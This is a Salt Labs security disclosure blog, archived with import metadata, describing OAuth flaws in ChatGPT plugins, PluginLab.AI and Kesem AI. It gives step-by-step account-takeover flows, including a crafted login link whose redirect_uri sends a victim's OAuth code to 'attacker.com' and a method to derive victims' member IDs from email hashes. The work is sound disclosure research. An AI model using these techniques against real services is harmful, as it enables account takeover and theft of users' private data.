---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-03-13_security-flaws-within-chatgpt-ecosystem-allowed-access-to-accounts-on-third-part.md
original_filename: 2024-03-13_security-flaws-within-chatgpt-ecosystem-allowed-access-to-accounts-on-third-part.md
title: Security Flaws within ChatGPT Ecosystem Allowed Access to Accounts On Third-Party
  Websites and Sensitive Data
category: documents
detected_topics:
- oauth
- api-security
- sso
- access-control
- xss
- command-injection
tags:
- imported
- documents
- oauth
- api-security
- sso
- access-control
- xss
- command-injection
language: en
raw_sha256: badc85830f2a3e3197052f660bda2ec87ca390e6d28e948f0e3e67fe08888961
text_sha256: b0423c53782204bad5092eaac7e6657d3eef74edd4397d38a0e7a84491935c37
ingested_at: '2026-06-28T07:32:32Z'
sensitivity: unknown
redactions_applied: false
---

# Security Flaws within ChatGPT Ecosystem Allowed Access to Accounts On Third-Party Websites and Sensitive Data

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-03-13_security-flaws-within-chatgpt-ecosystem-allowed-access-to-accounts-on-third-part.md
- Source Type: markdown
- Detected Topics: oauth, api-security, sso, access-control, xss, command-injection
- Ingested At: 2026-06-28T07:32:32Z
- Redactions Applied: False
- Raw SHA256: `badc85830f2a3e3197052f660bda2ec87ca390e6d28e948f0e3e67fe08888961`
- Text SHA256: `b0423c53782204bad5092eaac7e6657d3eef74edd4397d38a0e7a84491935c37`


## Content

---
title: "Security Flaws within ChatGPT Ecosystem Allowed Access to Accounts On Third-Party Websites and Sensitive Data"
page_title: "ChatGPT Vulnerability - Security Flaws within ChatGPT"
url: "https://salt.security/blog/security-flaws-within-chatgpt-extensions-allowed-access-to-accounts-on-third-party-websites-and-sensitive-data"
final_url: "https://salt.security/blog/security-flaws-within-chatgpt-extensions-allowed-access-to-accounts-on-third-party-websites-and-sensitive-data"
authors: ["Aviad Carmel (@AviadCarmel)"]
programs: ["OpenAI (ChatGPT)", "PluginLab.AI", "KesemAI"]
bugs: ["AI", "LLM", "Account takeover", "OAuth"]
publication_date: "2024-03-13"
added_date: "2024-07-30"
source: "pentester.land/writeups.json"
original_index: 381
---

Salt Labs

# Security Flaws within ChatGPT Ecosystem Allowed Access to Accounts On Third-Party Websites and Sensitive Data

March 13, 2024

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/68154675c8fd52cf04d62775_AviadCarmel.avif)[Aviad Carmel](/blog-authors/aviad-carmel)

Security Researcher

_Salt Labs researchers identified generative AI ecosystems as a new interesting attack vector. vulnerabilities found during this research on ChatGPT ecosystem could have granted access to accounts of users, including GitHub repositories, including 0-click attacks._

## Intro ChatGPT

Unless you’ve been living under a rock for the past year or so, you’ve probably heard of generative AI platforms.  
Generative AI platforms were introduced to the public with the appearance of ChatGPT, a next-level AI developed by OpenAI that leverages the LLM (Large Language Model) model and makes it possible to chat with service just as you were talking to a Human.  
It understands and answers questions, helps with different tasks, and can write stories and articles and generate answers that feel like an Eminem song or anything else you might think of.

In its early releases, ChatGPT and other generative AI frameworks only included data that was available to the framework during the training process. This means that it could answer many data-related questions, but it couldn't look over real-time data. If you asked ChatGPT, “What time is the Knicks on?” — it would simply reply, “I only have information about events that happened until 2021.” This is totally understandable given the way Generative AI platforms operate. However, this was also one of the biggest drawbacks of these platforms, as it considerably limited the questions you could ask the platform.

In order to address these issues all major Generative AI platforms have included the concept of a Generative AI ecosystem, which allows the connection and data exchange between the Generative AI platform and external services. These services could be anything from a simple internet search to a connection to specific services like Github, Google Drive, Saleforce, etc. This makes ChatGPT not just a conversational agent but a powerful tool that can act on a wide range of platforms, streamlining workflows and providing more interactive and productive experiences. Similar to Generative AI's massive growth, these external connections gained a lot of traction and very quickly expanded (and are still growing) to include hundreds of different external connections.  
‍

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6785b738eb2dec17fe0ec75f_65ed8361b15323c91978af8f_Screenshot%25202024-03-10%2520at%252011.54.24.png)

## The security aspect

Generative AI is a huge technological achievement, and some may even say is the most important achievement computer science has made in the last decade.  
And as with any technology, and especially new technologies, it doesn't come without risks.

Generally speaking, the risks from these platforms can originate from several places:

  1. Risks associated with the Generative AI platform itself — usually due to bugs or security vulnerabilities in the core platform.  
While this is still a new research topic, and the security community has not yet managed to cover most of it, some risks have already been identified and published.  
Some examples include two interesting vulnerabilities that were recently found. The first is [a research conducted by Ron Masas from Imperva](https://www.imperva.com/blog/xss-marks-the-spot-digging-up-vulnerabilities-in-chatgpt/), which revealed an impressive XSS within ChatGPT.  
Another interesting vulnerability recently revealed was a [cache deception attack discovered by “Harel Security Research".](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)  
Both vulnerabilities can be exploited once a victim clicks on a malicious URL, which allows an attacker to steal sensitive data from ChatGPT users.

  2. Risks associated with the Generative AI ecosystem — usually caused by security vulnerabilities in the code connecting Generative AI to the external services, or security vulnerabilities found in the third-party services themselves.  
  

Since the generative AI ecosystem seemed to us to be a relatively unexplored area in terms of possible security risks, we decided to start a research project that would deeply focus on this area and try and shed more light on the possible risks and possible outcomes of successful attacks on Generative AI platform ecosystems.

## The security aspect of ChatGPT plugins 

As usual in Salt Labs, our researchers pick the research target that they know and like best and the one they use on a day-to-day basis.  
For this reason, we decided to explore ChatGPT’s ecosystem. We strongly believe that our overall findings in this research are relevant to any generative AI platform, but in order to keep us focused — the scope of our research was only ChatGPT. 

In ChatGPT the ecosystem of connecting to third-party services is called ChatGPT plugins, and as mentioned before, they can pose a new interesting attack surface for attackers.

When you use those plugins, you actually give ChatGPT permission to send sensitive data on your behalf to a third-party website, and depending on the plugin, you also give permission to those plugins to access your private accounts on Google Drive, GitHub and More.

‍

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6785b738eb2dec17fe0ec756_65e795ca04a7e2dcd029efae_Picture2.png)

The image above, taken from ChatGPT, shows — if we can manage to find a vulnerability here — this will most probably put both your sensitive data in ChatGPT, and **also in third-party websites** , at risk.  
But what exactly is a plugin?

Easy — a plugin is simply an application created by “unknown” developers. However, the user interface is still ChatGPT, which gives users a more consistent (and “secure”) feeling.  
‍

> **Note — a word on ChatGPT GPTs**  
>  ‍  
> Our research took place in July 2023, when “ChatGPT plugins” was the main feature, and therefore, this is the focus of the blog. While plugins are still very popular, in November 2023, [ChatGPT introduced a new feature — GPTs](https://openai.com/blog/introducing-gpts). GPTs are custom versions of ChatGPT that any developer can publish, and contain an option called “Action” which connects it with the outside world. GPTs Actions is a similar concept to Plugins, and we’ll explore a vulnerability that the Salt Labs team found in several third-party GPTs in a follow-up post.  
> It is important to mention that OpenAI has done excellent work on GPTs security, a major improvement over Plugins, solving many of the “Plugins” issues described in this blog.

‍

### About our research

The first part of the research focuses on a vulnerability found directly in ChatGPT, allowing attackers to install malicious plugins on ChatGPT users, without their approval. 

The second part of this blog is a security review of the plugins concept, with a demonstration of two critical account takeover vulnerabilities within dozens of plugins. The focus of this is not on the discovery of a specific third-party plugin but rather on the general concept. We present here repeating issues and vulnerabilities that we keep finding over and over on several plugins. We believe that some of these vulnerabilities could be avoided if developers were more aware of the risk, and we hope that our blog will help achieve that goal. We also call on OpenAI to put more emphasis on security in their documentation for developers, which we will explain further when looking at our third vulnerability discovery.

## The first vulnerability, directly in ChatGPT allows attackers to install malicious plugins on ChatGPT users.

To understand the first vulnerability, we must first show you how an OAuth authentication works:

Assume you are Dan, and you want to connect to Example.com using your Facebook account. What happens when you click on “Login with Facebook”?

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6785b738eb2dec17fe0ec797_65ece7ebd02315435bb2aae0_Screenshot%25202024-03-10%2520at%25200.50.47.png)

‍

### In steps 2–3:

After Dan clicks on login with Facebook, www.example.com opens a new window to the following address:

_`https://www.facebook.com/v3.0/dialog/oauth?`_**_`redirect_uri=https://www.example.com/OAuth`_** _`&scope=email&client_id=1501&state=[random_value]&response_type=token`_

### In steps 4–5:

Facebook prepares a secret token for www.example.com and redirects the browser back to redirect_uri (the parameter from step 2). The exact redirection:

_`https://www.example.com/OAuth#token=[secret_token]`_

### In steps 6–7:

_www.example.com_ reads the token from the URL and uses it to talk directly with Facebook to complete the authentication and verify the identity of Dan.

### Note

Understanding the URL from steps 2–3 is optional (you can skip it). However, If you are curious and want to learn more about OAuth, you can read our full explanations of OAuth redirect manipulation as we described on Booking.com’s account takeover: <https://salt.security/blog/traveling-with-oauth-account-takeover-on-booking-com>

### Let’s put a focus on step 5:

_https://www.example.com/OAuth#token=[secret_token]_

In this step, _www.example.com_ receives the token, and identifies the user according to this token. What will happen if the attacker sends this link to a victim, but with the attacker’s credentials (token)?

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6785b738eb2dec17fe0ec76b_65ed8e1d44fc6983473be909_Screenshot%25202024-03-10%2520at%252012.40.17.png)

Since example.com is a vulnerable app that doesn’t verify that Dan started the OAuth flow, the victim (Dan) will be connected as the attacker to Example.com:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6785b738eb2dec17fe0ec75c_65ece85076ce6a044a77935a_Screenshot%25202024-03-10%2520at%25200.52.48.png)

**In this scenario, an attacker can manipulate victims to log in to a website with his credentials!**

You may ask yourself, **what is the big deal?** And you are not alone, a lot of OAuth developers think that it’s not a security issue and therefore don’t protect against those kinds of attacks.

To understand the big deal, I want to demonstrate it on ChatGPT.

‍

When a user installs a plugin that requires an OAuth user approval, ChatGPT starts the following flow:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6785b738eb2dec17fe0ec759_65ed84532e9c707b7eee0f99_Screenshot%25202024-03-10%2520at%252011.58.35.png)

### Steps 1–2:

When a user installs a new plugin, ChatGPT redirects him to the plugin website to receive a code (which, for this post, is the same as token).

### Step 3–5:

The user needs to approve the plugin, after the user approves, the plugin generates a code and redirects the user back to ChatGPT with that code.

The plugin redirects the user to the following link:

_`https://chat.openai.com/aip/{plugin_ID}/oauth/callback?code=`_**_`{secret_code}`_**

### Steps 6–7:

When ChatGPT receives the code, it automatically installs the plugin and can interact with the plugin on behalf of the user.

Any message that the user writes inChatGPT, may be forwarded to the plugin.

**Sounds familiar? This is the same OAuth diagram as _www.example.com_. Step 5 in the new plugin installation, is the same as step 5 in OAuth authentication we just described. **

### The problem and attack:

ChatGPT doesn’t validate that the user indeed started the plugin installation. 

An attacker can send the link from Step 5 to a victim, and if a victim clicks on that link, a new malicious plugin with the attacker credentials will be automatically installed on the victim’s account. 

Any new message that the victim will write, may be transferred to the plugin. 

For example, the attacker can send the following link (a legitimate link to the _chatgpt.openai.com_ domain) to a victim:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6785b738eb2dec17fe0ec74d_65e799fbc827729b25dfce4d_Picture7.png)

{malicious_plugin_id} is the plugin identifier that the attacker wants to install on the victim.

{attacker_code_from_malicious_plugin) is the code that the attacker received from the plugin.

By clicking on this link, the victim installs a malicious plugin, **without a confirmation**. 

### The impact

Attacker can write his own plugin, which tells ChatGPT to forward almost any Chat data to this plugin, and then by exploiting a vulnerability in ChatGPT, he can install this malicious plugin on a victim account.

Since the attacker is the owner of this plugin, he can see the private chat data of the victim, which may include credentials, passwords or other sensitive data.

In the documentation of ChatGPT’s plugin, they write “Over time, we anticipate the system will evolve to accommodate more advanced use cases", so as ChatGPT’s plugins continue to evolve (now its called GPTs), the security impact of such vulnerabilities also becomes more significant.

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6785b738eb2dec17fe0ec74a_65ecebd9306c0277bcd1e816_Screenshot%25202024-03-10%2520at%25201.07.54.png)

### The mitigation

If you implement OAuth and want to protect against this scenario, you should implement a state parameter as described in the OAuth RFC:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6785b738eb2dec17fe0ec750_65e79aa1410cbe4f8f5972f8_Picture9.png)

Note that ChatGPT indeed implemented a state parameter, but their state was not a random value, and therefore could be guessed by the attacker.  
‍

## **The second vulnerability** — 0-click account takeover on multiple plugins, enables attackers to gain control of an organization's account on third-party websites like GitHub

Before we deep dive into details, we want to first explain what account takeover on a plugin means.

When you install a plugin that interacts with your GitHub, this plugin creates an additional account for you, on the plugin website, that stores your credentials for GitHub. Using those credentials the plugin can access private repositories that contain secrets and source code.

If the attacker gains control of your account in this plugin, then he can also access your private GitHub repositories.

### PluginLab 

PluginLab (pluginlab.ai) is a framework developers/companies use to develop plugins for ChatGPT.

Example plugins developed with PluginLab are ScholarAI, ChatOCR, KeyMateAI, ChatOCR, KeyMateAI, ShowNotes, Perfect Chirp and more.

In our example, we will use “AskTheCode” — a plugin developed with PluginLab.AI that lets you ask your GitHub repositories questions, which means that users who use this plugin, gave it an access to their GitHub repositories.

Account takeover on AskTheCode means attackers can access GitHub repositories of any user who uses this plugin.

In the picture below, we demonstrate how we could access a private repository of a victim — Dan Brown (moreisless3dan) using ChatGPT.

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6785b738eb2dec17fe0ec771_65ecee612fefae51ce1cdeb5_Screenshot%25202024-03-10%2520at%25201.18.48.png)

(The screenshot was taken from the attacker account, showing how he reads a private file from the GitHub of a victim)

### Technical details — how it works

When a user installs the plugin “AskTheCode” (or any other plugin developed with PluginLab.AI), ChatGPT starts the installation flow and those are the main steps:

  1. AskTheCode creates a new account for the user, and asks the user permission for access to his GitHub account. AskTheCode stores the GitHub credentials.
  2. AskTheCode generates a code for ChatGPT.
  3. ChatGPT uses the code to connect to the user Account on AskTheCode.
  4. Plugin installed.

For your convenience, we attached a diagram describing the flow:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6785b738eb2dec17fe0ec762_65ecec3c49caeebebd256127_Screenshot%25202024-03-10%2520at%25201.09.38.png)

What you need to take from the diagram is the “code”, which is a secret passed from AskTheCode to ChatGPT. You can treat the code like a password that ChatGPT uses to connect to Dan’s account on AskTheCode.

The goal of the attacker is to steal that code, and perform account takeover. 

The interesting thing is, that after Step 3, AskTheCode makes a request from the client's Browser to _https://auth.pluginlab.ai/oauth/authorize_ , to retrieve a code based on the user memberId:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6785b738eb2dec17fe0ec765_65e79b6e11356bdc09d14c82_Picture12.png)

And the response:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6785b738eb2dec17fe0ec747_65e79b84e5b51f22daf0bc5d_Picture13.png)

And then, in Step 5, AskTheCode redirects the user to ChatGPT with the code “5e806…” and then ChatGPT can use the code to perform action on behalf of the user in AskTheCode (GitHub eventually).

### The problem and the attack:

_https://auth.pluginlab.ai/oauth/authorized_ does not authenticate the request, which means that the attacker can insert another memberId (aka the victim) and get a code that represents the victim. With that code, he can use ChatGPT and access the GitHub of the victim.

The only thing the attacker needs is the memberId of the victim.

It can be achieved by using the endpoint _https://auth.pluginlab.ai/members/requestMagicEmailCode_.

The endpoint receives an email and returns (with no known reason) the memberID among other data:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6785b738eb2dec17fe0ec768_65e79bb8bbd5a4fc26a303a4_Picture14.png)

### The attack flow:

Assume we have an email of a victim:

  1. The attacker uses the endpoint _https://auth.pluginlab.ai/members/requestMagicEmailCode_ to to get the memberID of any user (victim) he wants.  
Note that the memberID is just SHA1 of the email, so instead of calling this API, the attacker can calculate the SHA1 value by himself.  
‍
  2. Once the attacker has the victim member id, he goes to ChatGPT, installs the “AskTheCode” plugin on his account, and intercept the request to _https://auth.pluginlab.ai/oauth/authorized_.  
In the request to _https://auth.pluginlab.ai/oauth/authorized_ , instead of sending the member ID of the attacker, the attacker can use the hash value from step , and receives a code that represents the victim.  
‍  

  3. The attacker forwards this code to ChatGPT.  
  

  4. **The attacker now can read all the repositories of the victim** , because he just installed AskTheCode with the victim account, on his own ChatGPT account. For example the attacker can write “Give me a list of all the private repositories”, ChatGPT will send this message to AskTheCode, which will connect to the GitHub repository of the victim to retrieve the data.  
(Note that the attacker can talk directly with the plugin, even without the use of ChatGPT.

#### Note:

This is a zero-click attack. The attacker can perform the account takeover **without** sending a link to his victims.

As we mentioned earlier, the vulnerability is not in AskTheCode, but within PluginLab.AI, and affected dozens of other plugins that use the PluginLab.AI framework. 

All the issues described in this post have been disclosed to PluginLab.AI, and the company acted very quickly to address and completely mitigate them. 

Security vulnerability can happen in any application, and the response is what matters. We appreciate the response of PluginLab.

This is their response:

> “The moment we were alerted to your findings, we initiated an immediate internal investigation. It brings me relief to inform you that, based on our findings, no user data has been compromised as a result of the identified vulnerability. At PluginLab, the security and integrity of our customers' data are paramount. We are pleased to report that the issue you highlighted has been promptly addressed and resolved, reinforcing the safety of our platform.”

They also sent a notice to their users, mentioning that no users have been impacted, nor has any critical data been compromised.

## The third type of vulnerability — OAuth redirection manipulation 

This is a classic OAuth vulnerability that we found in several plugins, but we will use the plugin Kesem AI just as an example.

The impact of the vulnerability is similiar to pluginlab.ai, it’s an account takeover on the plugin itself. Unlike PluginLab.AI which doesn’t require user interaction, in this vulnerability the attacker needs to send a link to the victim.

### Technical details

When a user installs the plugin “Charts by Kesem AI”, ChatGPT starts the following flow:

  1. Redirect the user to kesem.ai to retrieve an OAuth code:  
_`https://app.kesem.ai/login?response_type=code&client_id=474480292958-cjuv2hh070hr6ad6ei8h9slved6vng0d.apps.googleusercontent.com&redirect_uri=`_**_`https://chat.openai.com/aip/plugin-fac4e968-c6a5-4fc9-b578-11d958122868/oauth/callback`_** _`&scope=&state=34881ee1-98e1-4b54-8643-3c561178f1b3`_‍
  2. Kesem.ai authenticates the user using Google/Microsoft or email, and generates a code.  
‍
  3. Kesem.ai transfer the code to the redirect_uri from step 1:**  
_`https://chat.openai.com/aip/plugin-fac4e968-c6a5-4fc9-b578-11d958122868/oauth/callback`_** _`?code=eyJhbGciOiJSUzI1NiIsImtpZCI6ImM2MGI5ZGUwODBmZmFmYmZjMTgzMzllY2Q0NGFjNzdmN2ZhNGU4ZDMiLCJ0eXAiOiJKV1QifQ….`_

### The problem:

https://app.kesem.ai/login does not validate the redirect_uri, which means that the attacker can insert a malicious redirect_uri and steal the user credentials.

#### The attack flow:

  1. The attacker sends the following link to a victim:  
https://app.kesem.ai/login?response_type=code&client_id=474480292958-cjuv2hh070hr6ad6ei8h9slved6vng0d.apps.googleusercontent.com&redirect_uri=**https://attacker.com** &scope=&state=34881ee1-98e1-4b54-8643-3c561178f1b3  
‍
  2. When the victim clicks on that link, Kesem.ai automatically transfers the code to the redirect_uri from step 1:**  
https://attacker.com**?code=eyJhbGciOiJSUzI1NiIsImtpZCI6ImM2MGI5ZGUwODBmZmFmYmZjMTgzMzllY2Q0NGFjNzdmN2ZhNGU4ZDMiLCJ0eXAiOiJKV1QifQ….

Like the case with Pluginab.ai, The attacker has the credentials (code) of the victim, and can take over his account in the same way.

### What happens in other plugins?

Unfortunately, kesem.ai is just one example that we use here.

We found this exact vulnerability in other plugins, and we want to raise awareness and encourage plugin developers to pay more attention to OAuth and the redirect_uri parameter.

We also found plugins that indeed verify the redirect_uri, but only the domain and not the path. But this approach is vulnerable as well, because an attacker can change the path to his own malicious plugin and steal the code.

In the documentation of ChatGPT, they explain how to implement this flow, but without a focus on security. 

It would be great if OpenAI improves their documentation, both in Plugins (<https://platform.openai.com/docs/plugins/authentication>) and in Action (<https://platform.openai.com/docs/actions/authentication>), and write a sentence for developers emphasis the important of hardening the redirect_uri.

## What About ChatGPT GPTs? 

As we mentioned earlier, GPTs are the next version of Plugins, and you can read more about this feature here: <https://openai.com/blog/introducing-gpts>

Essentially these are the same concept as plugins but with enhanced security protocols. 

OpenAI has implemented appropriate measures to educate and warn the user everytime data is sent from ChatGPT to a third party vendor, making the user much more aware:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6785b738eb2dec17fe0ec76e_65e79d44b39e20ae7647e134_Picture15.png)

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/6785b738eb2dec17fe0ec753_65e79d55015e66e7f862a3ae_Picture16.png)

In conclusion, GPTs represent a significant enhancement in security over Plugins, effectively addressing the majority of concerns highlighted in this discussion. Nonetheless, users need to remain vigilant regarding potential risks.

Schedule a [personalized demo](https://content.salt.security/request-demo) or [contact us ](https://salt.security/contact-us)to learn how Salt can help defend your organization from API risks.

#### But do GPTs solve this problem altogether? Stay tuned for our next article (hint: they don't :)

## Disclosure Timeline

We worked through the following timeline in this coordinated disclosure process. Again, we thank ChatGPT, PluginLab.AI and Kesem.ai for taking action to resolve these critical vulnerabilities.

  * Salt Labs discovers the vulnerability in ChatGPT: June 25, 2023
  * Salt Labs discloses technical details to ChatGPT: July 10, 2023
  * Salt Labs discovers and discloses technical details to PluginLab.AI and KesemAI: September, 2023
  * After all vendors fixed their vulnerability, Salt Labs sends OpenAI, PluginLab.AI and Kesem.ai this technical blog detailing the vulnerabilities: February 27, 2024
  * Salt marketing team shares draft of blog and press release with each company’s marketing team: February 27, 2024
  * Salt publishes blog and press release: March 13, 2024

## 

## Tags

[Salt Labs](/blog-tags/salt-labs)

[API Vulnerability Analysis](/blog-tags/api-vulnerability-analysis)

[API Security Strategy](/blog-tags/api-security-strategy)

[API Attack Prevention](/blog-tags/api-attack-prevention)

## Categories

[Customer](/blog-categories/customer)

[Product](/blog-categories/product)

[Industry](/blog-categories/industry)

[Technical](/blog-categories/technical)

[Company](/blog-categories/company)

[Salt Labs](/blog-categories/salt-labs)

## Salt Security Blog

Sign up for the Salt Newsletter for the latest resources and blog posts.

## Our latest posts

[IndustryWe Trained Cybersecurity Startups to Win POVs, Not Solve ProblemsRoey Eliyahu | June 22, 2026If agents are connected to APIs, attackers can use them to explore and exploit weak authorization paths faster. The API vulnerability was already serious. Agentic access makes it scalable.Read more](/blog/we-trained-cybersecurity-startups-to-win-povs-not-solve-problems)

[IndustryDeconstructing the Agentic Stack: Why API Visibility Is the Ultimate Defense for AI AgentsRoy Bar Yosef | June 11, 2026Organizations are rushing to deploy AI agents, but many still lack a clear view of what those agents can access, which tools they can call, and which APIs they can trigger.Read more](/blog/deconstructing-the-agentic-stack-why-api-visibility-is-the-ultimate-defense-for-ai-agents)

[IndustryEveryone Is Buying AI Guardrails. But Agents Have the Keys to the Car.Roey Eliyahu | June 8, 2026The first wave of AI security was necessary. It gave us guardrails for prompts, models, and outputs. But agents changed the security question.Read more](/blog/everyone-is-buying-ai-guardrails-but-agents-have-the-keys-to-the-car)
